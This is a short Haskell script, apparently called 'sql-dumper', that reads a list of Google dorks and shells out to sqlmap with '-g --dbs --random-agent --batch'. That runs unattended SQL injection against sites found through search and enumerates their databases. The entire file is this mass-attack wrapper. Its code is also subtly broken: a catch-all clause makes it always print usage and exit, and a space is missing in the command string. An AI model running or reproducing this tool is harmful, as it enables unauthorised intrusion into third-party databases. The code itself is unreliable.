import System.Environment
import Data.List
import System.Exit
import System.Process
main = do
    let t = unlines.reverse.lines
    let usage = print "sql-dumper dork-list.txt"
    let parse _ = usage >> exitWith ExitSuccess
    let parse fs  = concat `fmap` mapM readFile fs
    getArgs >>= parse >>= (\x ->  callCommand ("sqlmap -g "++x ++  "--dbs --random-agent  --batch -t 5"))
